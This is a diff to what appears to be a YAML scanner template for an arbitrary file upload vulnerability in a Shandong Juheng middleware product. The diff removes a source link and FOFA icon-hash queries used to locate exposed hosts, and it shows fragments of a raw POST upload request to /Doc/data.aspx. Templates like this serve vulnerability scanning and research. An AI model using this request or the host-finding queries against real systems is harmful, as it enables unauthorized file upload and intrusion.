@@ -3,12 +3,8 @@ info:
   name: 山东聚恒网络技术有限公司聚恒中台datacore_filesave存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fe54feif4u3n3dlq'
+  description: ''
   tags: file-upload,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fe54feif4u3n3dlq
-    fofa: icon_hash="-2049533275" || icon_hash="-737808640" || icon_hash="-1557056363"
 http:
 - raw:
   - 'POST /Doc/data.aspx?type=upload&key=&ocrtype=&vo=&field= HTTP/1.1
@@ -81,10 +77,8 @@ http:
     Content-Disposition: form-data; name="cpath"
 
 
-
     ------geckoformboundary9933b1efc5e0d94a40b1571aebec8742--
 
-    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1784558838417-80268304-e5e7-43fe-ab0b-0d7a1a10de58.png)
 
     访问上传的地址'
   redirects: false
